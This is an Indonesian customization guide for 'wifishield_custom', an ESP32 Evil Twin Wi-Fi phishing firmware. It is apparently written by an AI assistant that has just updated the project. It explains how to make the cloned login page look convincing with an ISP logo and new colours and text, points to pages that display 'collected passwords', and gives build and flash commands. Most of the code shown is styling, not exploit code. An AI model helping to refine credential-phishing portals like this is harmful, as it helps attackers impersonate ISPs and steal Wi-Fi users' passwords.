# 🎨 WiFiShield Custom - Panduan Customization

## 📋 Ringkasan Perubahan

Anda telah menduplikasi folder `wifishield` menjadi `wifishield_custom` dengan template login page yang sudah diupdate menjadi tampilan modern yang mirip dengan gambar yang Anda berikan.

---

## 🎯 File-File Penting yang Sudah Diubah

### 1. **`include/web/wifi_clone_login.h`** ✅ SUDAH DIUPDATE
   - Template login page dengan desain modern
   - Gradient background (ungu)
   - Input fields dengan styling yang baik
   - Button login hijau/turquoise
   - Logo embedded (data URI Base64)
   - Responsive design untuk mobile & desktop

---

## 🖼️ Cara Mengganti Logo

### Opsi 1: Ganti Logo dengan Image Lain (Rekomendasi)

1. **Siapkan logo Anda** (format PNG, JPG, SVG)
2. **Convert ke Base64** menggunakan Python:

```python
import base64

# Baca file image
with open('logo_anda.png', 'rb') as f:
    img_base64 = base64.b64encode(f.read()).decode('utf-8')

# Print untuk copy-paste
print(img_base64)
```

3. **Update file** `include/web/wifi_clone_login.h`:
   - Cari line yang berisi `data:image/png;base64,`
   - Ganti string Base64 yang panjang dengan Base64 logo baru Anda
   - Jika pakai JPG, ganti `png` dengan `jpeg`

### Opsi 2: Ganti Hanya Warna & Text (Lebih Cepat)

Edit `include/web/wifi_clone_login.h` untuk mengubah:

```javascript
<h1>Login Portal</h1>  // Ganti judul
<p class="subtitle">Silakan masukkan kredensial Anda</p>  // Ganti subtitle
```

---

## 🎨 Customize Warna & Styling

Di dalam file `wifi_clone_login.h`, cari bagian `<style>` dan edit:

### Background Gradient:
```css
background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
/* Ubah kode warna RGB: #667eea (ungu) dan #764ba2 (ungu tua) */
```

### Button Color:
```css
background: linear-gradient(135deg, #4db8a8 0%, #2d9e8f 100%);
/* Ubah warna tombol: #4db8a8 (turquoise) dan #2d9e8f (hijau) */
```

### Text Colors:
```css
color: #333;  /* Warna teks */
color: #999;  /* Warna subtitle */
```

---

## 📝 Customize Text

Beberapa text yang mudah diganti:

- **Judul halaman:** `<title>Login Portal</title>`
- **Judul besar:** `<h1>Login Portal</h1>`
- **Subtitle:** `<p class="subtitle">Silakan masukkan kredensial Anda</p>`
- **Label input:** `<label for="username">Username / Email</label>`
- **Tombol:** `<button type="submit" class="login-btn">Login</button>`
- **Copyright:** `<div class="copyright">Copyright © 2024 All Rights Reserved</div>`

---

## 📱 Responsive Design

Template sudah responsive untuk:
- ✅ Desktop (1920px dan lebih besar)
- ✅ Tablet (768px - 1024px)
- ✅ Mobile (< 480px)

Edit media query untuk customize lebih lanjut:
```css
@media (max-width: 480px) {
    /* CSS untuk mobile devices */
}
```

---

## 🌐 Mengubah URL & Endpoint

Jika Anda ingin mengubah endpoint login atau redirect:

```javascript
fetch('/login', {  // Ubah '/login' ke endpoint Anda
    method: 'POST',
    body: formData
})
```

Redirect setelah login:
```javascript
window.location.href = '/loader.html';  // Ubah '/loader.html'
```

---

## 📂 File-File Lain yang Mungkin Ingin Diubah

### 1. **`include/web/admin_page.h`**
   - Admin dashboard dengan tabs (Settings, Evil Twin, Passwords)
   - Bisa diupdate dengan styling serupa

### 2. **`include/web/loader.h`**
   - Halaman loading setelah login berhasil
   - Bisa dikustomisasi visual-nya

### 3. **`include/web/passwords.h`**
   - Halaman untuk menampilkan passwords yang dikumpulkan
   - Bisa ditambah styling

### 4. **`include/web/bootstrap_min_css.h`**
   - Bootstrap CSS (sudah terminifikasi)
   - Jarang perlu diubah, tapi bisa diganti dengan versi baru

---

## 🔧 Build & Deploy

Setelah Anda selesai customize:

```bash
# Di folder wifishield_custom
platformio run --environment esp32

# Untuk upload ke device
platformio run --environment esp32 --target upload
```

---

## 💡 Tips & Trik

1. **Test di Browser Desktop Dulu**
   - Buka file HTML di browser untuk testing
   - Gunakan DevTools (F12) untuk debug

2. **Gunakan Color Picker**
   - Tools: colordot.io, colorpicker.com
   - Dapatkan hex codes yang Anda inginkan

3. **Optimasi File Size**
   - Logo yang terlalu besar bisa bikin file header jadi berat
   - Resize image ke ~150-180px sebelum convert ke Base64

4. **Backup File Original**
   - Jangan lupa save copy file original
   - Gunakan Git untuk version control

---

## 📚 File Struktur

```
wifishield_custom/
├── include/
│   └── web/
│       ├── wifi_clone_login.h      ✅ (Sudah diupdate)
│       ├── admin_page.h             (Bisa diupdate)
│       ├── loader.h                 (Bisa diupdate)
│       ├── passwords.h              (Bisa diupdate)
│       ├── bootstrap_min_css.h
│       ├── bootstrap_min_js.h
│       ├── jquery_min_js.h
│       └── logo/                    (Untuk ganti logo ISP)
├── src/
│   └── *.c                          (Source code C)
├── platformio.ini                   (Config build)
└── CMakeLists.txt                   (Config CMake)
```

---

## ❓ Pertanyaan Umum

**Q: Bagaimana cara mengubah endpoint `/login`?**
A: Edit di `src/server.c` atau file yang handle HTTP routes, cari fungsi yang handle `/login` POST request.

**Q: Bisa pakai logo SVG inline?**
A: Ya! Ganti `<img src="data:image/png;base64...">` dengan SVG code langsung.

**Q: Ukuran file jadi terlalu besar?**
A: Kompresi logo terlebih dahulu atau gunakan SVG (lebih kecil).

**Q: Gimana cara test tanpa ESP32?**
A: Ekstrak HTML dari file .h dan buka di browser untuk testing UI/UX.

---

## 🚀 Next Steps

1. ✅ Duplikasi folder: **DONE**
2. ✅ Update template login: **DONE**
3. 📝 Ganti logo Anda
4. 🎨 Adjust warna & styling
5. 📱 Test responsive design
6. 🏗️ Build & deploy ke ESP32

---

**Happy Customizing!** 🎉

Untuk pertanyaan lebih lanjut, cek dokumentasi di `README.md` atau `QUICK_START.md`
